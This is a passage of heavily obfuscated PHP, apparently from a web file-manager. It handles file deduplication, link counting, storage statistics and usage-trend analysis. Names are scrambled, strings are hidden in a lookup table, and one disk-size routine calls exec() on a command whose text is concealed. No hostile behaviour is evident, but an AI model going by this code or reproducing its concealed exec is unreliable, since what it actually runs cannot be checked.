$å¼„…ëø[$ûÇœåÀ[650]] : IO::hashSimple($˜îŒê¥¸), $ûÇœåÀ[1927] => $Î²Æ“ÈÌ ? $Î²Æ“ÈÌ : $Û¹Áéşø); if ($œ‚•Şº… = $this->addFileCheckExist($ˆÏ·Í¿½[$ûÇœåÀ[650]], $ˆÏ·Í¿½[$ûÇœåÀ[524]], $ˆÏ·Í¿½[$ûÇœåÀ[76]])) { return $œ‚•Şº…; } return $this->addFileData($ˆÏ·Í¿½); } private function addFileData($—´Ö¸í–) { $›ŸÎùŠ’ =& $_SERVER[–Ú¬çÁ]; if (!$—´Ö¸í–) { return !1; } $—´Ö¸í–[$›ŸÎùŠ’[76]] = intval($—´Ö¸í–[$›ŸÎùŠ’[76]]); if (!$—´Ö¸í–[$›ŸÎùŠ’[76]] && strlen($—´Ö¸í–[$›ŸÎùŠ’[650]]) > 32) { $—´Ö¸í–[$›ŸÎùŠ’[76]] = intval(substr($—´Ö¸í–[$›ŸÎùŠ’[650]], 32)); } $Û€öÛ± = $this->add($—´Ö¸í–); return $this->find($Û€öÛ±); } public function addFile($•Ë‰ïšŸ, $…¯€èêÌ, $²—æëÏÂ = false) { $€¿Òí– =& $_SERVER[–Ú¬çÁ]; $ÊœÉÌ ‚ = IO::hashSimple($•Ë‰ïšŸ); $ÄÕÖîÍ« = IO::size($•Ë‰ïšŸ); $¢ºáøƒ” = $ÄÕÖîÍ« <= 1024 * 1024 * 10 ? IO::hashMd5($•Ë‰ïšŸ) : $€¿Òí–[12]; $è˜ö×ŠÑ = $€¿Òí–[1928] . $ÊœÉÌ ‚; CacheLock::lock($è˜ö×ŠÑ); if ($¢ºáøƒ” && $ÊœÉÌ ‚) { $”¾¹êşÅ = $this->addFileCheckExist($ÊœÉÌ ‚, $¢ºáøƒ”, $ÄÕÖîÍ«); if ($”¾¹êşÅ) { CacheLock::unlock($è˜ö×ŠÑ); return $”¾¹êşÅ; } } $ú•ÅëË = $this->addFileMake($•Ë‰ïšŸ, $ÄÕÖîÍ«, $ÊœÉÌ ‚, $¢ºáøƒ”, $…¯€èêÌ, $²—æëÏÂ); $¨–úë²  = $this->addFileData($ú•ÅëË); CacheLock::unlock($è˜ö×ŠÑ); if (!$¢ºáøƒ” && $¨–úë² ) { $this->fileMd5Check($¨–úë² ); } return $¨–úë² ; } public function fileMd5Check($¼Ø™óªÑ) { $‚øÖØ­Ã =& $_SERVER[–Ú¬çÁ]; $ËËº‚×Î = array($¼Ø™óªÑ[$‚øÖØ­Ã[518]], $¼Ø™óªÑ[$‚øÖØ­Ã[84]]); $éƒ­ïğ = $‚øÖØ­Ã[1929] . $¼Ø™óªÑ[$‚øÖØ­Ã[84]]; $¼šŠ€§æ = $‚øÖØ­Ã[1930] . $¼Ø™óªÑ[$‚øÖØ­Ã[518]]; TaskQueue::add($‚øÖØ­Ã[1931], $ËËº‚×Î, $éƒ­ïğ, $¼šŠ€§æ); } public function fileMd5Set($ÅıÁÂØ, $è®³†¥) { $óò¼‘Ï =& $_SERVER[–Ú¬çÁ]; $ŒîŸÏœ = $this->find($ÅıÁÂØ); if (!$ŒîŸÏœ || $ŒîŸÏœ[$óò¼‘Ï[524]]) { return; } $ìÔñóæ¤ = IO::hashMd5($è®³†¥); if (!$ìÔñóæ¤) { return $óò¼‘Ï[12]; } $this->where(array($óò¼‘Ï[518] => $ÅıÁÂØ))->save(array($óò¼‘Ï[524] => $ìÔñóæ¤)); } public function addFileMake($‘”±“…š, $øÔ–²Æù, $¤ÙÚÊ¸¨, $Ç­À©İ, $–†ÙÜê, $ îëÑõ) { $Çšéëå =& $_SERVER[–Ú¬çÁ]; $Í—§‰‘ = $this->createFileName($–†ÙÜê, $¤ÙÚÊ¸¨, $Ç­À©İ); $ò£´Ç‘Å = get_path_father($Í—§‰‘); $äãå™ = get_path_this($Í—§‰‘); if ($ îëÑõ) { $¾ÁÓÁÅ° = IO::move($‘”±“…š, $ò£´Ç‘Å, !1, $äãå™); } else { $¾ÁÓÁÅ° = IO::copy($‘”±“…š, $ò£´Ç‘Å, !1, $äãå™); } if (!$¾ÁÓÁÅ°) { return !1; } $Ş…±¥« = KodIO::defaultDriver(); $ ó•õ¦ = array($Çšéëå[595] => $øÔ–²Æù, $Çšéëå[1925] => 1, $Çšéëå[471] => $–†ÙÜê, $Çšéëå[828] => $Ş…±¥«[$Çšéëå[452]], $Çšéëå[472] => $Í—§‰‘, $Çšéëå[1926] => $¤ÙÚÊ¸¨, $Çšéëå[1927] => $Ç­À©İ); return $ ó•õ¦; } public function addFileCheckExist($ğŞ†òÚ¡, $©¡²·ÔÜ, $‚Ò«Çâ) { $„ĞïÃ…‹ =& $_SERVER[–Ú¬çÁ]; $ƒÛêŞ‹… = $this->findByHash($ğŞ†òÚ¡, $©¡²·ÔÜ); if (!$ƒÛêŞ‹…) { return !1; } $äË¾í§Ü = array($„ĞïÃ…‹[1925] => intval($ƒÛêŞ‹…[$„ĞïÃ…‹[1932]]) + 1, $„ĞïÃ…‹[595] => $‚Ò«Çâ); $this->where(array($„ĞïÃ…‹[519] => $ƒÛêŞ‹…[$„ĞïÃ…‹[518]]))->save($äË¾í§Ü); return $ƒÛêŞ‹…; } public function remove($Â…Ù©İ‘) { $this->linkCountChange($Â…Ù©İ‘, !1); $this->clearEmpty(); return !0; } public function linkAdd($ÔÀ¯¯ÎŸ) { $this->linkCountChange($ÔÀ¯¯ÎŸ, !0); } public function linkCountChange($˜ëİêˆö, $“ŒçıÇª) { $ÜíŞã„ =& $_SERVER[–Ú¬çÁ]; if (!$˜ëİêˆö) { return; } if (!is_array($˜ëİêˆö)) { $˜ëİêˆö = array($˜ëİêˆö); } $ú€èöé¦ = array(); foreach ($˜ëİêˆö as $¨×¨Ë”Ş) { $§É™Çˆ = $¨×¨Ë”Ş . $ÜíŞã„[12]; if (!$ú€èöé¦[$§É™Çˆ]) { $ú€èöé¦[$§É™Çˆ] = 0; } $ú€èöé¦[$§É™Çˆ]++; } $ÃÑæí¢¯ = array(); foreach ($ú€èöé¦ as $¨×¨Ë”Ş => $‡’ÍÛÈ‡) { $§É™Çˆ = $‡’ÍÛÈ‡ . $ÜíŞã„[12]; if (!$ÃÑæí¢¯[$§É™Çˆ]) { $ÃÑæí¢¯[$§É™Çˆ] = array(); } $ÃÑæí¢¯[$§É™Çˆ][] = $¨×¨Ë”Ş; } foreach ($ÃÑæí¢¯ as $‡’ÍÛÈ‡ => $Åû´«²‘) { if (!$Åû´«²‘) { continue; } $‡’ÍÛÈ‡ = $“ŒçıÇª ? $‡’ÍÛÈ‡ : -intval($‡’ÍÛÈ‡); $µ¤¤ = array($ÜíŞã„[518] => array($ÜíŞã„[7], $Åû´«²‘)); if ($‡’ÍÛÈ‡ < 0) { $µ¤¤[$ÜíŞã„[1932]] = array($ÜíŞã„[1035], abs($‡’ÍÛÈ‡)); } $this->where($µ¤¤)->setAdd($ÜíŞã„[1932], $‡’ÍÛÈ‡); } } public function findByHash($§ü»ç, $•ïÑü = false) { $ÜŠ’ºúÈ =& $_SERVER[–Ú¬çÁ]; if (!$§ü»ç && !$•ïÑü) { return !1; } $ÈÛ¸„»¼ = array($ÜŠ’ºúÈ[1926] => $§ü»ç); if ($•ïÑü) { $ÈÛ¸„»¼ = array($ÜŠ’ºúÈ[1927] => $•ïÑü); } return $this->order($ÜŠ’ºúÈ[1933])->where($ÈÛ¸„»¼)->find(); } public function clearEmpty($óÙòÍ½ï = 0) { $“ğŠ„º =& $_SERVER[–Ú¬çÁ]; $¡è‰¶ë = time() - 3600 * 24 * $óÙòÍ½ï; $¨¬˜ë¸¾ = $“ğŠ„º[1934] . $¡è‰¶ë; $¸ùÌ = $this->where($¨¬˜ë¸¾)->select(); if (!$¸ùÌ) { return; } $ôÀËöµ³ = new Task($“ğŠ„º[1935], $“ğŠ„º[12], count($¸ùÌ)); foreach ($¸ùÌ as $êŠí­Í…) { $ôÀËöµ³->update(1); $this->resetFile($êŠí­Í…); } $ôÀËöµ³->end(); } public function resetFile($ÖäŠ¯Ö) { $²»ÂÛ¼¸ =& $_SERVER[–Ú¬çÁ]; $ÜçéíÇÙ = array($²»ÂÛ¼¸[519] => $ÖäŠ¯Ö[$²»ÂÛ¼¸[518]]); $Êì«¨ä· = Model($²»ÂÛ¼¸[1352])->where($ÜçéíÇÙ)->count(); $®ÑŠ“À½ = Model($²»ÂÛ¼¸[1936])->where($ÜçéíÇÙ)->count(); $Ù”ÄÇ‚ø = intval($Êì«¨ä·) + intval($®ÑŠ“À½); if ($Ù”ÄÇ‚ø == 0) { IO::remove($ÖäŠ¯Ö[$²»ÂÛ¼¸[84]]); Model($²»ÂÛ¼¸[1937])->delete($ÖäŠ¯Ö[$²»ÂÛ¼¸[518]]); $this->where($ÜçéíÇÙ)->delete(); $this->metaSet($ÖäŠ¯Ö[$²»ÂÛ¼¸[518]], null, null); return; } if ($ÖäŠ¯Ö[$²»ÂÛ¼¸[1932]] != $Ù”ÄÇ‚ø) { $this->where($ÜçéíÇÙ)->save(array($²»ÂÛ¼¸[1925] => $Ù”ÄÇ‚ø)); } } public function storageInfo($€»¦ö®¦ = false) { $¯ÛæéåÏ =& $_SERVER[–Ú¬çÁ]; $ŞóÄ“ìû = $this->count() + 0.0; $ËÃ¤üí¸ = 0; $ğÚ²ŒŒŒ = 1; $ÈÉó¿¼× = 0; $¯¸ÄÄ‚š = 5000; for ($Ä‚ÖÉöğ = 0; $Ä‚ÖÉöğ < $ŞóÄ“ìû; $Ä‚ÖÉöğ = $Ä‚ÖÉöğ + $¯¸ÄÄ‚š) { $æœƒ¿‰ = $this->limit($Ä‚ÖÉöğ, $Ä‚ÖÉöğ + $¯¸ÄÄ‚š)->select(); foreach ($æœƒ¿‰ as $´—¨ñ¡¾) { $ğÚ²ŒŒŒ += $´—¨ñ¡¾[$¯ÛæéåÏ[76]] * $´—¨ñ¡¾[$¯ÛæéåÏ[1932]]; $ËÃ¤üí¸ += $´—¨ñ¡¾[$¯ÛæéåÏ[76]] * ($´—¨ñ¡¾[$¯ÛæéåÏ[1932]] - 1); $ÈÉó¿¼× += $´—¨ñ¡¾[$¯ÛæéåÏ[1932]]; } } $â‘€¤È’ = array($¯ÛæéåÏ[1938] => $ğÚ²ŒŒŒ, $¯ÛæéåÏ[1939] => $ËÃ¤üí¸, $¯ÛæéåÏ[1940] => $ËÃ¤üí¸ / $ğÚ²ŒŒŒ, $¯ÛæéåÏ[80] => $ŞóÄ“ìû, $¯ÛæéåÏ[1941] => $ÈÉó¿¼×); return $â‘€¤È’; } } goto F‡×ºê—ª; EˆõÉµµ˜œ: class AnalysisModel extends ModelBaseLight { public function init($¥ä—ø·¸) { $‘„Ü°à =& $_SERVER[–Ú¬çÁ]; $©ğÌ¦ß = array($‘„Ü°à[640] => array($‘„Ü°à[33] => $‘„Ü°à[1793], $‘„Ü°à[326] => array($‘„Ü°à[249], $‘„Ü°à[785], $‘„Ü°à[1794], $‘„Ü°à[1795])), $‘„Ü°à[1796] => array($‘„Ü°à[33] => $‘„Ü°à[1797], $‘„Ü°à[326] => array($‘„Ü°à[249], $‘„Ü°à[783], $‘„Ü°à[1798], $‘„Ü°à[1799], $‘„Ü°à[1800]))); if (!isset($©ğÌ¦ß[$¥ä—ø·¸])) { return !1; } $this->optionType = $©ğÌ¦ß[$¥ä—ø·¸][$‘„Ü°à[33]]; $this->field = $©ğÌ¦ß[$¥ä—ø·¸][$‘„Ü°à[326]]; return !0; } public function listData($²ß›¾´· = false, $è‘‘Á¿² = "\x6d\157\144\151\146\171\x54\x69\x6d\145", $ ÕÌªç = false) { return parent::listData($²ß›¾´·, $è‘‘Á¿², $ ÕÌªç); } public function trendList($ÌÆŸ˜ä) { $²©ƒœÜ =& $_SERVER[–Ú¬çÁ]; $ØÙİà« = $this->listData(); if ($ØÙİà«) { $ƒ–öÑ « = end($ØÙİà«); $ĞØóÍŒ³ = date($²©ƒœÜ[1801], strtotime($²©ƒœÜ[1802])); if ($ƒ–öÑ «[$²©ƒœÜ[249]] == $ĞØóÍŒ³) { return $ØÙİà«; } $“­ç­ƒ¿ = strtotime($ƒ–öÑ «[$²©ƒœÜ[249]]); } if (!isset($“­ç­ƒ¿)) { $˜¸Ğ®äĞ = $ÌÆŸ˜ä == $²©ƒœÜ[640] ? $²©ƒœÜ[577] : $²©ƒœÜ[845]; $“­ç­ƒ¿ = Model($˜¸Ğ®äĞ)->min($²©ƒœÜ[225]); } $ğ»¸óµ€ = $²©ƒœÜ[1803] . ucfirst($ÌÆŸ˜ä); $¨Å˜˜¸¨ = $this->dateList($“­ç­ƒ¿); foreach ($¨Å˜˜¸¨ as $ĞØóÍŒ³) { $this->{$ğ»¸óµ€}($ĞØóÍŒ³); } return $this->listData(); } private function dateList($—…ğ÷ğ‚) { $µ‹ò¹Õ =& $_SERVER[–Ú¬çÁ]; $ï¦ê‡“ = $—…ğ÷ğ‚; $¸Ñ¼©ú = strtotime($µ‹ò¹Õ[1802]); $ëê²úà– = array(); while ($ï¦ê‡“ <= $¸Ñ¼©ú) { $ëê²úà–[] = date($µ‹ò¹Õ[1801], $ï¦ê‡“); $ï¦ê‡“ = strtotime($µ‹ò¹Õ[1804], $ï¦ê‡“); } return $ëê²úà–; } public function _recordUser($Ê™ê…Ë = '') { $·§›ªÛĞ =& $_SERVER[–Ú¬çÁ]; $ıëëáÀ = strtotime(date($·§›ªÛĞ[1805], strtotime($Ê™ê…Ë))); $¸ĞÚŞç = strtotime(date($·§›ªÛĞ[1806], strtotime($Ê™ê…Ë))); $Â»úÙ½‡ = array($·§›ªÛĞ[225] => array($·§›ªÛĞ[1033], $¸ĞÚŞç)); $Ôå—”±® = Model($·§›ªÛĞ[577])->where($Â»úÙ½‡)->count($·§›ªÛĞ[1666]); $Â»úÙ½‡[$·§›ªÛĞ[225]] = array($·§›ªÛĞ[386], array($ıëëáÀ, $¸ĞÚŞç)); $µ¾ÈØî = Model($·§›ªÛĞ[577])->where($Â»úÙ½‡)->count($·§›ªÛĞ[1666]); $Â»úÙ½‡[$·§›ªÛĞ[33]] = $·§›ªÛĞ[1807]; $¤ñÇˆšá = Model($·§›ªÛĞ[1808])->where($Â»úÙ½‡)->count($·§›ªÛĞ[1809]); $Ÿ··ûÃ“ = array($·§›ªÛĞ[249] => $Ê™ê…Ë, $·§›ªÛĞ[785] => (int) $Ôå—”±®, $·§›ªÛĞ[1794] => (int) $µ¾ÈØî, $·§›ªÛĞ[1795] => (int) $¤ñÇˆšá); return $this->insert($Ÿ··ûÃ“); } public function _recordStore($èƒú¼üÎ = '') { $–àİİóÇ =& $_SERVER[–Ú¬çÁ]; $ã„üÂĞ˜ = strtotime(date($–àİİóÇ[1806], strtotime($èƒú¼üÎ))); $ÊäÊİ¹Ş = array($–àİİóÇ[225] => array($–àİİóÇ[1033], $ã„üÂĞ˜)); $‘£Ùæ÷ = Model($–àİİóÇ[521])->where($ÊäÊİ¹Ş)->sum($–àİİóÇ[76]); $ÊäÊİ¹Ş[$–àİİóÇ[462]] = 0; $ŞÙÙÆÁœ = Model($–àİİóÇ[845])->where($ÊäÊİ¹Ş)->sum($–àİİóÇ[76]); $ÊäÊİ¹Ş[$–àİİóÇ[178]] = 1; $ÚÚ ØèÇ = Model($–àİİóÇ[845])->where($ÊäÊİ¹Ş)->sum($–àİİóÇ[76]); $ÊäÊİ¹Ş[$–àİİóÇ[178]] = 2; $ÈÉõÛÃÉ = Model($–àİİóÇ[845])->where($ÊäÊİ¹Ş)->sum($–àİİóÇ[76]); $â¿î¢ƒ = array($–àİİóÇ[249] => $èƒú¼üÎ, $–àİİóÇ[783] => (int) $ŞÙÙÆÁœ, $–àİİóÇ[1798] => (int) $‘£Ùæ÷, $–àİİóÇ[1799] => (int) $ÚÚ ØèÇ, $–àİİóÇ[1800] => (int) $ÈÉõÛÃÉ); return $this->insert($â¿î¢ƒ); } public function trend($ğ”£ÀŞ‡, $Ïö©¤ÜŒ) { $ ÇÈë¢Ï =& $_SERVER[–Ú¬çÁ]; if (!$this->init($ğ”£ÀŞ‡)) { return !1; } $‡äÍ¦ô¡ = $this->trendList($ğ”£ÀŞ‡); if ($‡äÍ¦ô¡ && $Ïö©¤ÜŒ != $ ÇÈë¢Ï[1639]) { $–éÄ†ËÔ = $‡äÍ¦ô¡[0][$ ÇÈë¢Ï[249]]; $òÍáàƒİ = $this->validDate($Ïö©¤ÜŒ, $–éÄ†ËÔ); $üËõ½ñ = array(); $§‘€«¨¬ = array_to_keyvalue($‡äÍ¦ô¡, $ ÇÈë¢Ï[249]); foreach ($òÍáàƒİ as $¶¶Âáâè) { if (isset($§‘€«¨¬[$¶¶Âáâè])) { $û¤ŠÛÅÆ = $§‘€«¨¬[$¶¶Âáâè]; } else { $û¤ŠÛÅÆ = end($‡äÍ¦ô¡); $û¤ŠÛÅÆ[$ ÇÈë¢Ï[249]] = $¶¶Âáâè; if ($ğ”£ÀŞ‡ == $ ÇÈë¢Ï[640]) { $û¤ŠÛÅÆ[$ ÇÈë¢Ï[1794]] = $û¤ŠÛÅÆ[$ ÇÈë¢Ï[1795]] = 0; } } $üËõ½ñ[] = $û¤ŠÛÅÆ; } $‡äÍ¦ô¡ = $üËõ½ñ; } $ËŞÁâº = array($ ÇÈë¢Ï[640] => array($ ÇÈë¢Ï[785] => LNG($ ÇÈë¢Ï[1810]), $ ÇÈë¢Ï[1794] => LNG($ ÇÈë¢Ï[1811]), $ ÇÈë¢Ï[1795] => LNG($ ÇÈë¢Ï[1812])), $ ÇÈë¢Ï[1796] => array($ ÇÈë¢Ï[783] => LNG($ ÇÈë¢Ï[1813]), $ ÇÈë¢Ï[1798] => LNG($ ÇÈë¢Ï[1814]), $ ÇÈë¢Ï[1799] => LNG($ ÇÈë¢Ï[1815]), $ ÇÈë¢Ï[1800] => LNG($ ÇÈë¢Ï[1816]))); $Á¦Ğç–Ì = array($ ÇÈë¢Ï[640] => $ ÇÈë¢Ï[1817], $ ÇÈë¢Ï[1796] => $ ÇÈë¢Ï[76]); if (empty($‡äÍ¦ô¡)) { $¶¶Âáâè = date($ ÇÈë¢Ï[1801], strtotime($ ÇÈë¢Ï[1802])); $‡××“·Ñ = array($ ÇÈë¢Ï[249] => $¶¶Âáâè); foreach ($ËŞÁâº[$ğ”£ÀŞ‡] as $×«—¶ıÍ => $¾Ëüşéì) { $‡××“·Ñ[$×«—¶ıÍ] = 0; } $‡äÍ¦ô¡[] = $‡××“·Ñ; } $£Ş‘‚‘’ = array(); foreach ($‡äÍ¦ô¡ as $¾Ëüşéì) { if ($ğ”£ÀŞ‡ == $ ÇÈë¢Ï[1796] && $¾Ëüşéì[$ ÇÈë¢Ï[1798]] > $¾Ëüşéì[$ ÇÈë¢Ï[783]]) { $¾Ëüşéì[$ ÇÈë¢Ï[1798]] = $¾Ëüşéì[$ ÇÈë¢Ï[783]]; } foreach ($ËŞÁâº[$ğ”£ÀŞ‡] as $×«—¶ıÍ => $ï‘±×ÖÁ) { $û¤ŠÛÅÆ = array($ ÇÈë¢Ï[249] => $¾Ëüşéì[$ ÇÈë¢Ï[249]], $ ÇÈë¢Ï[1561] => $ï‘±×ÖÁ); $û¤ŠÛÅÆ[$Á¦Ğç–Ì[$ğ”£ÀŞ‡]] = isset($¾Ëüşéì[$×«—¶ıÍ]) ? $¾Ëüşéì[$×«—¶ıÍ] : 0; $£Ş‘‚‘’[] = $û¤ŠÛÅÆ; } } return $£Ş‘‚‘’; } public function validDate($âßÎé‘‰, $Ôé÷ï) { $¡éğøÔò =& $_SERVER[–Ú¬çÁ]; $×É÷†ó = date($¡éğøÔò[1801], strtotime($¡éğøÔò[1802])); $Îíªß = array($×É÷†ó); switch ($âßÎé‘‰) { case $¡éğøÔò[1646]: $œ·†š¤ = mktime(0, 0, 0, date($¡éğøÔò[1818]), date($¡éğøÔò[1380]) - date($¡éğøÔò[1443]) + 7 - 7, date($¡éğøÔò[1819])); $ëşÇ²Ÿ = 0; do { $…Ã²ÃÖØ = date($¡éğøÔò[1801], $œ·†š¤ - 3600 * 24 * 7 * $ëşÇ²Ÿ); $Îíªß[] = $…Ã²ÃÖØ; $ëşÇ²Ÿ++; } while ($Ôé÷ï < $…Ã²ÃÖØ); break; case $¡éğøÔò[1644]: $ëşÇ²Ÿ = 1; do { $ç±Õ¼äÛ = date($¡éğøÔò[1820], strtotime("\x2d\x20{$ëşÇ²Ÿ}\x20\155\x6f\x6e\x74\150\x73")); $Îíªß[] = $ç±Õ¼äÛ; $ëşÇ²Ÿ++; } while ($Ôé÷ï < $ç±Õ¼äÛ); break; case $¡éğøÔò[1821]: $ìùÉñ‡¡ = (int) date($¡éğøÔò[1819], strtotime($Ôé÷ï)); $ãŸÜ–ğ = (int) date($¡éğøÔò[1819]); if ($ìùÉñ‡¡ >= $ãŸÜ–ğ) { break; } for ($ìùÉñ‡¡; $ìùÉñ‡¡ < $ãŸÜ–ğ; $ìùÉñ‡¡++) { $Îíªß[] = $ìùÉñ‡¡ . $¡éğøÔò[1822]; } break; default: break; } if ($Ôé÷ï > end($Îíªß)) { array_pop($Îíªß); } sort($Îíªß); return $Îíªß; } public function listTable($÷ºÌËñ) { $§’¸û‡Ä = ucfirst($÷ºÌËñ); return Model($§’¸û‡Ä)->listData(); } public function option($İ‰Òã‡) { $êØóêûÄ = $_SERVER[–Ú¬çÁ][1823] . ucfirst($İ‰Òã‡); return $this->{$êØóêûÄ}(); } private function optionUser() { $ëœò®Ã =& $_SERVER[–Ú¬çÁ]; $²Â™±Õè = Model($ëœò®Ã[577])->count($ëœò®Ã[1666]); $ˆ‹’£Àù = Model($ëœò®Ã[577])->where($ëœò®Ã[1824])->count($ëœò®Ã[1666]); $ÃïÆê‚Í = intval($GLOBALS[$ëœò®Ã[6]][$ëœò®Ã[402]][$ëœò®Ã[1618]]) / 3600; $µ‚íşî» = strtotime("\x2d{$ÃïÆê‚Í}\x20\x68\x6f\x75\162\x73"); $õûŠÄÊĞ = strtotime(date($ëœò®Ã[1805])); if ($µ‚íşî» < $õûŠÄÊĞ) { $µ‚íşî» = $õûŠÄÊĞ; } $·¿Õ‚¨ = array($ëœò®Ã[1825] => array($ëœò®Ã[1034], $µ‚íşî»)); $‰ºº†ëÃ = (int) Model($ëœò®Ã[577])->where($·¿Õ‚¨)->count($ëœò®Ã[1666]); if (!$‰ºº†ëÃ) { $‰ºº†ëÃ = 1; } $·¿Õ‚¨ = array($ëœò®Ã[1825] => array($ëœò®Ã[1034], $õûŠÄÊĞ)); $•ß¦òí‚ = Model($ëœò®Ã[577])->where($·¿Õ‚¨)->count($ëœò®Ã[1666]); return array($ëœò®Ã[778] => (int) $²Â™±Õè, $ëœò®Ã[1826] => (int) ($²Â™±Õè - $ˆ‹’£Àù), $ëœò®Ã[1827] => (int) $ˆ‹’£Àù, $ëœò®Ã[1828] => (int) $•ß¦òí‚, $ëœò®Ã[1829] => $‰ºº†ëÃ); } private function optionFile() { $˜âìŒª„ =& $_SERVER[–Ú¬çÁ]; $—­—–êø = $this->sourceSize(); $¢à·éÕ¿ = $—­—–êø[$˜âìŒª„[76]]; $ï–Ššİ¢ = $—­—–êø[$˜âìŒª„[1798]]; $·• ÒÃí = Model($˜âìŒª„[845])->where(array($˜âìŒª„[462] => 0))->count($˜âìŒª„[181]); $Ÿè±Øğ§ = array($˜âìŒª„[462] => 0, $˜âìŒª„[225] => array($˜âìŒª„[1034], strtotime(date($˜âìŒª„[1805])))); $áº‹ä¾á = Model($˜âìŒª„[845])->where($Ÿè±Øğ§)->sum($˜âìŒª„[76]); $¾£÷É¡» = Model($˜âìŒª„[845])->where($Ÿè±Øğ§)->count($˜âìŒª„[181]); return array($˜âìŒª„[783] => $¢à·éÕ¿, $˜âìŒª„[1798] => $ï–Ššİ¢, $˜âìŒª„[1830] => $¢à·éÕ¿ - $ï–Ššİ¢, $˜âìŒª„[1831] => (int) $áº‹ä¾á, $˜âìŒª„[785] => (int) $·• ÒÃí, $˜âìŒª„[1832] => (int) $¾£÷É¡»); } private function optionAccess() { $úŞ±¿Ÿø =& $_SERVER[–Ú¬çÁ]; return array($úŞ±¿Ÿø[778] => $this->typeLogCnt(), $úŞ±¿Ÿø[107] => $this->typeLogCnt($úŞ±¿Ÿø[107]), $úŞ±¿Ÿø[502] => $this->typeLogCnt($úŞ±¿Ÿø[502]), $úŞ±¿Ÿø[1833] => $this->typeLogCnt($úŞ±¿Ÿø[1833]), $úŞ±¿Ÿø[1834] => $this->typeLogCnt($úŞ±¿Ÿø[1834]), $úŞ±¿Ÿø[640] => $this->typeLogCnt($úŞ±¿Ÿø[12], $úŞ±¿Ÿø[1809])); } private function typeLogCnt($Õè—ÏÆå = '', $›Ã‹€´° = "\151\x64") { $µ¢¾ÒÊ’ =& $_SERVER[–Ú¬çÁ]; $ã×“¹Ó = array($µ¢¾ÒÊ’[107] => array($µ¢¾ÒÊ’[1835], $µ¢¾ÒÊ’[1836]), $µ¢¾ÒÊ’[502] => array($µ¢¾ÒÊ’[1837], $µ¢¾ÒÊ’[1838]), $µ¢¾ÒÊ’[1833] => array($µ¢¾ÒÊ’[1839], $µ¢¾ÒÊ’[1840], $µ¢¾ÒÊ’[1841]), $µ¢¾ÒÊ’[1834] => array($µ¢¾ÒÊ’[1842], $µ¢¾ÒÊ’[1843]), $µ¢¾ÒÊ’[1844] => array($µ¢¾ÒÊ’[1845], $µ¢¾ÒÊ’[1846], $µ¢¾ÒÊ’[1847])); $•ßƒ´îÖ = strtotime(date($µ¢¾ÒÊ’[1805])); $¾ğ³Œ€¥ = array($µ¢¾ÒÊ’[225] => array($µ¢¾ÒÊ’[1034], $•ßƒ´îÖ)); if ($Õè—ÏÆå) { $¾ğ³Œ€¥[$µ¢¾ÒÊ’[33]] = array($µ¢¾ÒÊ’[7], $ã×“¹Ó[$Õè—ÏÆå]); } $ğ»÷ÔË” = Model($µ¢¾ÒÊ’[1808])->where($¾ğ³Œ€¥)->count($›Ã‹€´°); return (int) $ğ»÷ÔË”; } private function optionServer() { $Î›½­ÛÖ =& $_SERVER[–Ú¬çÁ]; $ÃÎùĞœà = $this->diskDriver(); $Ù´ÂÏ´ = KodIO::defaultDriver(); $üÊ¡€çØ = array($Î›½­ÛÖ[837] => $Ù´ÂÏ´[$Î›½­ÛÖ[452]]); $ê•ïì¼í = Model($Î›½­ÛÖ[521])->where($üÊ¡€çØ)->sum($Î›½­ÛÖ[76]); $œÍÆÔÖ¹ = explode($Î›½­ÛÖ[53], $_SERVER[$Î›½­ÛÖ[144]]); $‚ÈÌ„© = $œÍÆÔÖ¹[0]; $ËÛÊÌã = $GLOBALS[$Î›½­ÛÖ[6]][$Î›½­ÛÖ[21]]; $ôËÔÌ = $ËÛÊÌã[$Î›½­ÛÖ[996]]; if ($ôËÔÌ == $Î›½­ÛÖ[984]) { $á¹àåˆ‡ = explode($Î›½­ÛÖ[1302], $ËÛÊÌã[$Î›½­ÛÖ[995]]); $ôËÔÌ = $á¹àåˆ‡[0]; } if ($ôËÔÌ == $Î›½­ÛÖ[932] || $ôËÔÌ == $Î›½­ÛÖ[824]) { $…¼ŞËäÈ = Model()->db()->query($Î›½­ÛÖ[1848]); $ªŞŞåÌù = $…¼ŞËäÈ[0] && isset($…¼ŞËäÈ[0][$Î›½­ÛÖ[1560]]) ? $…¼ŞËäÈ[0][$Î›½­ÛÖ[1560]] : 0; $ôËÔÌ = $Î›½­ÛÖ[1849] . ($ªŞŞåÌù ? $Î›½­ÛÖ[8] . $ªŞŞåÌù : $Î›½­ÛÖ[12]); } $ñµÓ÷®ª = $GLOBALS[$Î›½­ÛÖ[6]][$Î›½­ÛÖ[402]][$Î›½­ÛÖ[847]]; return array($Î›½­ÛÖ[1850] => $ÃÎùĞœà ? $ÃÎùĞœà[$Î›½­ÛÖ[1851]] : 0, $Î›½­ÛÖ[1852] => $ÃÎùĞœà ? $ÃÎùĞœà[$Î›½­ÛÖ[1853]] : 0, $Î›½­ÛÖ[1854] => (int) $Ù´ÂÏ´[$Î›½­ÛÖ[1851]] * 1024 * 1024 * 1024, $Î›½­ÛÖ[1855] => (int) $ê•ïì¼í, $Î›½­ÛÖ[1856] => ucfirst($‚ÈÌ„©), $Î›½­ÛÖ[1857] => $Î›½­ÛÖ[1858] . PHP_VERSION, $Î›½­ÛÖ[1859] => phpBuild64() ? 64 : 32, $Î›½­ÛÖ[777] => str_replace($Î›½­ÛÖ[1150], $Î›½­ÛÖ[1012], $ôËÔÌ), $Î›½­ÛÖ[402] => ucfirst($ñµÓ÷®ª), $Î›½­ÛÖ[32] => $_SERVER[$Î›½­ÛÖ[1860]]); } private function diskDriver() { $û³Ñ¥“ß =& $_SERVER[–Ú¬çÁ]; $ºÚ•àÓ = $û³Ñ¥“ß[8]; $ÀÊåÒŸ = $GLOBALS[$û³Ñ¥“ß[6]][$û³Ñ¥“ß[1319]] == $û³Ñ¥“ß[1320]; if ($ÀÊåÒŸ) { $ºÚ•àÓ = $û³Ñ¥“ß[1861]; if (function_exists($û³Ñ¥“ß[1862])) { exec($û³Ñ¥“ß[1863], $¥©í¢÷Ø); $ºÚ•àÓ = $¥©í¢÷Ø[1] . $û³Ñ¥“ß[8]; } } if (!file_exists($ºÚ•àÓ)) { return; } $š¸ê¦Ïö = @disk_total_space($ºÚ•àÓ); $ì¼å±ñ = $š¸ê¦Ïö - @disk_free_space($ºÚ•àÓ); return array($û³Ñ¥“ß[1851] => $š¸ê¦Ïö, $û³Ñ¥“ß[1853] => $ì¼å±ñ); } public function fileChart($ŠøÓÑ) { $·‹¥àø³ =& $_SERVER[–Ú¬çÁ]; if (isset($ŠøÓÑ[$·‹¥àø³[1666]])) { return 